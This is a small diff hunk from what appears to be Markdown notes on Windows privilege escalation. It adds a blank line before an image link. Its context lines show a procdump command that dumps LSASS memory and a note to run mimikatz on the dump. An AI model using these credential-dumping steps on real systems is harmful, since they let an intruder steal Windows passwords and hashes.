@@ -71,6 +71,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 or
+
 ![image](https://user-images.githubusercontent.com/128841823/232630604-454078d5-aa14-4f0b-8843-c3b1b1bd163e.png)
 
 transfer or direct mimikats to the lsass.dmp
